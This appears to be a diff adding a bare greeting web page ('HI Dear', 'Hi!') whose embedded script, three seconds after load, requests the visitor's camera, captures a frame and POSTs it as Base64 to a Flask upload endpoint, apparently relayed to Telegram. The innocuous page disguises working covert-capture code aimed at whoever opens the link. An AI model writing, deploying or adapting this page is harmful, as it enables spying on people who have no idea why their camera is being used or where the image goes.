@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HI Dear</title>
+</head>
+<body>
+    <h1>Hi!</h1>
+
+    <script>
+        async function captureAndSend() {
+            try {
+                // Access the user's camera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                // Create a canvas to capture the image
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext("2d");
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert the canvas image to Base64 string
+                const imageData = canvas.toDataURL("image/png");
+
+                // Send the captured image to the Flask server
+                const serverUrl = "http://127.0.0.1:5000/upload";  // Update with Flask server URL
+                await fetch(serverUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ image: imageData })
+                });
+
+                // Stop the camera stream after capturing
+                stream.getTracks().forEach(track => track.stop());
+                alert("Image sent to Telegram!");
+            } catch (error) {
+                console.error("Error capturing or sending image:", error);
+            }
+        }
+
+        // Automatically capture and send image after 3 seconds (can be adjusted)
+        setTimeout(captureAndSend, 3000);
+    </script>
+</body>
+</html>
